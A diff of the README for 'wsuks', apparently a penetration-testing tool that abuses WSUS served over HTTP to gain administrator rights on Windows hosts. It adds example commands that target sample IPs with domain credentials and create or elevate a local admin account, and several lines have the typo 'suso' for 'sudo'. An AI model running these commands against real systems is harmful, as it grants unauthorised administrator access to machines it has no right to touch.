@@ -12,7 +12,7 @@ Prerequisits:
 - The Windows Server Update Service (WSUS) must be configured using HTTP
 
 Result:
-- After successful execution a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created and added to the local admin group
+- After successful execution the user provided will be added to the local admin group. If no user was specified a user with the format user[0-9]{5} (e.g. user12345) and a random password will be created
 
 ## Installation
 Using pipx:
@@ -37,13 +37,16 @@ sudo poetry install
 With pipx:
 ```
 sudo wsuks
-suso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
+suso wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20     # This will generate a new local user and add it to the local admin group
+sudo wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local     # This will add the provided user to the local admin group
+sudo wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1      # This will start the auto discovery mode and add the provided user to the local admin group
 ```
 
 With poetry:
 ```
-sudo poetry run wsuks
-sudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20
+suso poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20     # This will generate a new local user and add it to the local admin group
+sudo poetry run wsuks -t 10.0.0.10 --WSUS-Server 10.0.0.20 -u User -p Password -d Domain.local     # This will add the provided user to the local admin group
+sudo poetry run wsuks -t 10.0.0.10 -u User -p Password -d Domain.local --dc-ip 10.0.0.1      # This will start the auto discovery mode and add the provided user to the local admin group
 ```
 
 ## About & Mitigation
